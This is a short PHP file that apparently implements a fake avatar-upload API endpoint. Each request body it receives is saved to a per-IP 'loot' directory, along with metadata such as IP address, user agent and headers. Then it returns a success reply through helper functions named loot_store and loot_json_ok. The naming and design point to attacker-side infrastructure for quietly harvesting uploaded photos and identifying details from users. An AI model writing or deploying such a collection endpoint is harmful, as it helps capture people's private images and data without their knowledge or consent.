<?php
// Save raw body to loot
$rawBody = file_get_contents('php://input');
if (strlen($rawBody) > 0) {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $ts = round(microtime(true) * 1000);
    $lootDir = "/www/wwwroot/i.131422.com/loot/{$ip}";
    if (!is_dir($lootDir)) mkdir($lootDir, 0755, true);
    file_put_contents("{$lootDir}/raw_avatar_pic_{$ts}.bin", $rawBody);
    $meta = json_encode([
        'ts' => $ts,
        'path' => $_SERVER['REQUEST_URI'],
        'ip' => $ip,
        'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
        'bodyLen' => strlen($rawBody),
        'timestamp' => $_SERVER['HTTP_TIMESTAMP'] ?? '',
        'content_type' => $_SERVER['CONTENT_TYPE'] ?? '',
    ]);
    file_put_contents("{$lootDir}/raw_avatar_pic_{$ts}.meta.json", $meta);
}
// POST /api/user/avatar/pic —— 照片文件上传：原始落盘 + 应答
require_once '/www/wwwroot/i.131422.com/api/loot_raw.php';
loot_store('avatar_pic');
loot_json_ok();
